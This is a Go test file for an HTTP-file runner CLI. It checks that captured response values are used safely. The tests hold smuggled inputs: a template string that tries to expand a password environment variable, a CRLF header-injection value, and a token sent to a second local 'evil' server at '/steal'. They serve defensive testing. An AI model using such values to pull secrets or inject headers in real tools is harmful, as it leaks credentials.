package cli

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

type captureHit struct {
	method, uri string
	header      http.Header
}

type captureSrv struct {
	srv         *httptest.Server
	mu          sync.Mutex
	hits        []captureHit
	loginStatus int
}

func newCaptureSrv(t *testing.T) *captureSrv {
	t.Helper()
	c := &captureSrv{loginStatus: 200}
	c.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		c.mu.Lock()
		c.hits = append(c.hits, captureHit{r.Method, r.URL.RequestURI(), r.Header.Clone()})
		c.mu.Unlock()
		if r.URL.Path == "/login" {
			w.Header().Set("X-Req-Id", "rid-1")
			w.WriteHeader(c.loginStatus)
			_, _ = w.Write([]byte(`{"data":{"token":"LOGIN-TOKEN","items":[{"id":9}],"evil":"{{token}}-{{$env API_PASSWORD}}","nl":"a\r\nX-Evil: 1","n":5}}`))
			return
		}
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	t.Cleanup(c.srv.Close)
	return c
}

func (c *captureSrv) count(path string) int {
	n := 0
	for _, h := range c.hits {
		if strings.HasPrefix(h.uri, path) {
			n++
		}
	}
	return n
}

func (c *captureSrv) last() captureHit { return c.hits[len(c.hits)-1] }

func captureSetup(t *testing.T) (*captureSrv, func(body string, args ...string) result) {
	t.Helper()
	srv := newCaptureSrv(t)
	dir := projectWith(t, nil)
	file := filepath.Join(dir, "flow.http")
	t.Setenv("API_BASE_URL", srv.srv.URL)
	t.Setenv("API_TOKEN", "SESSION-TOKEN")
	t.Setenv("API_ENV", "")
	t.Setenv("API_PASSWORD", "pw-secret")
	return srv, func(body string, args ...string) result {
		_ = os.WriteFile(file, []byte(body), 0o600)
		return run(t, "", append([]string{"run", file}, args...)...)
	}
}

const flowFile = `
### Login
# @name login
POST /login
Content-Type: application/json

{"user":"me"}

### Me
# @name me
GET /me/{{login.response.body.data.items[0].id}}?n={{login.response.body.data.n}}
Authorization: Bearer {{login.response.body.data.token}}
X-Id: {{login.response.headers.X-Req-Id}}
X-Status: {{login.response.status}}
`

func TestRunCapturesAResponseAndRunsTheDependencyFirst(t *testing.T) {
	srv, runFlow := captureSetup(t)

	r := runFlow(flowFile, "me")
	if r.code != 0 {
		t.Fatalf("%+v", r)
	}
	if srv.count("/login") != 1 || srv.count("/me") != 1 {
		t.Fatalf("hits: %+v", srv.hits)
	}
	me := srv.last()
	if me.uri != "/me/9?n=5" || me.header.Get("Authorization") != "Bearer LOGIN-TOKEN" ||
		me.header.Get("X-Id") != "rid-1" || me.header.Get("X-Status") != "200" {
		t.Fatalf("captured values not used: %+v", me)
	}
	if !strings.Contains(r.err, `running "login" first`) {
		t.Fatalf("the dependency should be announced: %q", r.err)
	}
	if strings.Contains(r.out, "LOGIN-TOKEN") {
		t.Fatalf("the dependency's output must not be printed: %q", r.out)
	}
}

func TestRunAllRunsADependencyOnce(t *testing.T) {
	srv, runFlow := captureSetup(t)
	if r := runFlow(flowFile, "--all"); r.code != 0 || srv.count("/login") != 1 || srv.count("/me") != 1 {
		t.Fatalf("%+v hits=%d", r, len(srv.hits))
	}
}

func TestCapturedValuesAreDataNeverTemplates(t *testing.T) {
	srv, runFlow := captureSetup(t)
	r := runFlow(flowFile+"\n### Evil\n# @name evil\nGET /e\nX-Lit: {{login.response.body.data.evil}}\n", "evil")
	if r.code != 0 {
		t.Fatalf("%+v", r)
	}
	got := srv.last().header.Get("X-Lit")
	if got != "{{token}}-{{$env API_PASSWORD}}" {
		t.Fatalf("a server value was expanded as a template: %q", got)
	}
	if strings.Contains(got, "SESSION-TOKEN") || strings.Contains(got, "pw-secret") {
		t.Fatalf("a secret was pulled in by a server value: %q", got)
	}
}

func TestCapturedValuesCannotInjectHeaders(t *testing.T) {
	srv, runFlow := captureSetup(t)
	r := runFlow(flowFile+"\n### N\nGET /n\nX-N: {{login.response.body.data.nl}}\n", "N")
	if r.code == 0 || !strings.Contains(r.err, "line break") || srv.count("/n") != 0 {
		t.Fatalf("%+v hits=%+v", r, srv.hits)
	}
}

func TestCapturedValuesGoToTheActiveServerOnly(t *testing.T) {
	srv, runFlow := captureSetup(t)
	evil := newCaptureSrv(t)
	body := flowFile + "\n### Leak\nGET " + evil.srv.URL + "/steal\nX-T: {{login.response.body.data.token}}\n"

	r := runFlow(body, "Leak")
	if r.code == 0 || !strings.Contains(r.err, "--trust-hosts") || len(evil.hits) != 0 {
		t.Fatalf("a captured token went to another host: %+v evil=%+v", r, evil.hits)
	}
	_ = srv
	if r := runFlow(body, "Leak", "--trust-hosts"); r.code != 0 || len(evil.hits) != 1 || evil.hits[0].header.Get("X-T") != "LOGIN-TOKEN" {
		t.Fatalf("--trust-hosts is the explicit opt-in: %+v %+v", r, evil.hits)
	}
}

func TestCapturePathsAreKeysAndIndexesOnly(t *testing.T) {
	srv, runFlow := captureSetup(t)
	for name, expr := range map[string]string{
		"pipe":    "login.response.body.data | env",
		"env fn":  "login.response.body.data.token | env.API_PASSWORD",
		"slice":   "login.response.body.data.items[0:1]",
		"missing": "login.response.body.data.nope",
	} {
		r := runFlow(flowFile+"\n### X\nGET /x\nX-V: {{"+expr+"}}\n", "X")
		if r.code == 0 || srv.count("/x") != 0 {
			t.Errorf("%s: %+v", name, r)
		}
		if name != "missing" && !strings.Contains(r.err, "only keys and [n] indexes") {
			t.Errorf("%s: %q", name, r.err)
		}
	}
}

func TestCaptureNeedsANamedRequestThatExists(t *testing.T) {
	srv, runFlow := captureSetup(t)
	r := runFlow("### X\nGET /x\nX-V: {{nosuch.response.body.a}}\n", "X")
	if r.code == 0 || !strings.Contains(r.err, `no request named "nosuch"`) || len(srv.hits) != 0 {
		t.Fatalf("%+v", r)
	}
}

func TestCaptureCyclesAreRefused(t *testing.T) {
	srv, runFlow := captureSetup(t)
	r := runFlow(`
### A
# @name a
GET /a
X-V: {{b.response.status}}

### B
# @name b
GET /b
X-V: {{a.response.status}}
`, "a")
	if r.code == 0 || !strings.Contains(r.err, "cycle") || len(srv.hits) != 0 {
		t.Fatalf("%+v hits=%d", r, len(srv.hits))
	}
	if r := runFlow("### A\n# @name a\nGET /a\nX-V: {{a.response.status}}\n", "a"); r.code == 0 || !strings.Contains(r.err, "cycle") {
		t.Fatalf("self reference: %+v", r)
	}
}

func TestFailedDependencyStopsTheRequest(t *testing.T) {
	srv, runFlow := captureSetup(t)
	srv.loginStatus = 500
	r := runFlow(flowFile, "me")
	if r.code == 0 || !strings.Contains(r.err, "login: HTTP 500") || srv.count("/me") != 0 {
		t.Fatalf("%+v", r)
	}
}

func TestCaptureDryRunSendsNothingAndShowsPlaceholders(t *testing.T) {
	srv, runFlow := captureSetup(t)
	r := runFlow(flowFile, "me", "--dry")
	if r.code != 0 || len(srv.hits) != 0 || !strings.Contains(r.out, "X-Status: <login.response.status>") || strings.Count(r.out, "curl ") != 1 {
		t.Fatalf("%+v hits=%d", r, len(srv.hits))
	}
}
